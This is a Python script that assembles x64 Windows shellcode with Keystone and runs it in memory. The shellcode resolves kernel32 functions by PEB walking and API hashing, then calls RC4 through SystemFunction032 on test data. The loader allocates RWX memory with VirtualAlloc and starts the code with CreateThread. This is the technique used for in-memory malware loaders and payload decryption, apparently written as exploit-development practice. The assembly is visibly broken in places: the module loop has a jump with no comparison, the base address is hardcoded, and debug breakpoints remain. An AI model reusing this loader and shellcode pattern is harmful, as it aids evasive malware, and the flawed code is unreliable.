from keystone import *
import ctypes, struct

CODE = (
    " start: "
        " mov rbp, rsp ;" 
        " add rsp, 0xfffffffffffffdf0h ;" # Avoid NULL bytes
        " xor rbx, rbx; "

    " find_kernel32: " #
        " xor rcx, rcx ;" # rcx = 0
        " mov rsi,gs:[rcx+0x60] ;" # ESI = &(PEB) ([FS:0x60])
        " mov rsi,[rsi+0x18] ;" # ESI = PEB->Ldr
        " mov rsi,[rsi+0x30] ;" # ESI = PEB->Ldr.InInitOrder
    " next_module: " #
        " mov rbx, 0x00007ff847420000 ;" # rbx = InInitOrder[X].base_address
        " mov rdi, [rsi+0x40] ;" # EDI = InInitOrder[X].module_name
        " mov rsi, [rsi] ;" # ESI = InInitOrder[X].flink (next)
        
        
    " jne next_module ;" # No: try next module
    " int3;"
    " find_function_shorten: " #
        " jmp find_function_shorten_bnc ;" # Short jump
    
    " find_function_ret: " #
        " pop rsi ;" # POP the return address from the stack
        " mov [rbp+0x08], rsi ;" # Save find_function address for later usage
        " jmp resolve_symbols_kernel32 ;" #

    " find_function_shorten_bnc: " #
        " call find_function_ret ;" # Relative CALL with negative offset

    " find_function: " #
        " push rsp ;"
        " push rax ;" # Save all registers
        " push rcx ;" # Save all registers
        " push rdx ;" # Save all registers
        " push rbx ;" # Save all registers
        " push rbp ;" # Save all registers
        " push rsi ;" # Save all registers
        " push rdi ;" # Save all registers
        " mov eax, [rbx+0x3c] ;" # Offset to PE Signature
        " mov edi, [rbx+rax+0x88] ;" # Export Table Directory RVA
        " add rdi, rbx ;" # Export Table Directory VMA
        " mov ecx, [rdi+0x14] ;" # NumberOfNames
        " xor rax, rax ;"
        " mov eax, [rdi+0x20] ;" # AddressOfNames RVA
        " add rax, rbx ;" # AddressOfNames VMA
        " mov [rbp-8], rax ;" # Save AddressOfNames VMA for later
        

    " find_function_loop: " #
        " jecxz find_function_finished ;" # Jump to the end if rcx is 0
        " dec rcx ;" # Decrement our names counter
        " mov rax, [rbp-8] ;" # Restore AddressOfNames VMA
        " mov esi, [rax+rcx*4] ;" # Get the RVA of the symbol name
        " add rsi, rbx ;"
        
    " compute_hash: " #
        " xor eax, eax ;" # NULL EAX
        " cdq ;" # NULL EDX
        " cld ;" # Clear direction

    " compute_hash_again: " #
        " lodsb ;" # Load the next byte from esi into al
        " test al, al ;" # Check for NULL terminator
        " jz compute_hash_finished ;" # If the ZF is set,we've hit the NULL term
        " ror edx, 0x0d ;" # Rotate edx 13 bits to the right
        " add edx, eax ;" # Add the new byte to the accumulator
        " jmp compute_hash_again ;" # Next iteration
        " compute_hash_finished: " #
        
        
        
    " find_function_compare: " #
        
        " cmp rdx, [rsp+0x48] ;" # Compare the computed hash with the requested hash
        " jnz find_function_loop ;" # If it doesn't match go back to find_function_loop
        " mov edx, [rdi+0x24] ;" # AddressOfNameOrdinals RVA
        " add rdx, rbx ;" # AddressOfNameOrdinals VMA
        " mov cx, [rdx+2*rcx] ;" # Extrapolate the function's ordinal
        " mov edx, [rdi+0x1c] ;" # AddressOfFunctions RVA
        " add rdx, rbx ;" # AddressOfFunctions VMA
        " mov eax, [rdx+4*rcx] ;" # Get the function RVA
        " add rax, rbx ;" # Get the function VMA
        " mov [rsp+0x30], rax;"
        
        
        
    " find_function_finished: " #

        " pop rdi ;" # Restore registers
        " pop rsi ;" # Restore registers
        " pop rbp ;" # Restore registers
        " pop rbx ;" # Restore registers
        " pop rdx ;" # Restore registers
        " pop rcx ;" # Restore registers
        " pop rax ;" # Restore registers
        " pop rsp ;" # Restore registers
        " ret ;" #

    " resolve_symbols_kernel32: "
  
        " mov rax, 0xce5d464a;"
        " push rax; "
        " int3;"
        " call qword ptr [rbp+0x08] ;" # Call find_function
        
        " mov qword ptr [rbp+0x18], rax ;" # Save GetLastError address for later usage

        " mov rax, 0x753a4fc;"
        " push rax; "
        " call qword ptr [rbp+0x08] ;"
        " mov qword ptr [rbp+0x20], rax;" # LoadLibraryExA

        " mov rax, 0x7c0dfcaa;"
        " push rax; "
        " call qword ptr [rbp+0x08] ;"
        " mov qword ptr [rbp+0x28], rax;" # GetProcAddress


    "exec_shellcode:"
        # LoadLibraryExA
        " xor rcx, rcx; "
        " push rcx; "
        " mov rax, 0x50535450595243;"
        " push rax;"
        " mov rcx, rsp; "
        " xor r8, r8; "
        " xor rdx, rdx; "
        " push r8; "
        " push rdx; "
        " push rcx; "
        " call qword ptr [rbp+0x20]; "
        # GetProcAddress
        " mov rcx, rax; "
        " mov rax, 0x32;"
        " push rax;"
        " mov rax, 0x33306e6f6974636e;"
        " push rax;"
        " mov rax, 0x75466d6574737953;"
        " push rax;"
        " mov rdx, rsp; "
        " sub rsp, 0x20; "
        " push rdx; "
        " push rcx; "
        " call qword ptr [rbp+0x28]; "
        " mov qword ptr [rbp+0x30], rax; "
        
        " add rsp, 0x08;"
        # data
        " mov rax, 0x4142;"
        " push rax; "
        " mov rcx, rsp; "
        " mov rdx, 0x02; "
        " push rcx;"
        " push rdx; "
        " mov qword ptr [rbp+0x38], rsp; "
        
        # key 
        " mov rax, 0x41;"
        " push rax; "
        " mov rcx, rsp; "
        " mov rdx, 0x01; "
        " push rcx;"
        " push rdx; "
        " mov qword ptr [rbp+0x40], rsp; "

        " mov rcx, [rbp+0x38];"
        " mov rdx, [rbp+0x40];"
        " push rdx; "
        " push rcx; "
        " int3;"
        " call qword ptr [rbp+0x30]; "
        

        
        



)
ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)
sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)
ctypes.cdll.LoadLibrary('cabinet')
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int64(0),
                            ctypes.c_int64(len(shellcode)),
                            ctypes.c_int64(0x3000),
                            ctypes.c_int64(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int64(ptr), buf, ctypes.c_int64(len(shellcode)))

print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int64(0),
                                        ctypes.c_int64(0),
                                        ctypes.c_int64(ptr),
                                        ctypes.c_int64(0),
                                        ctypes.c_int64(0),
                                        ctypes.pointer(ctypes.c_int64(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int64(ht), ctypes.c_int64(-1))

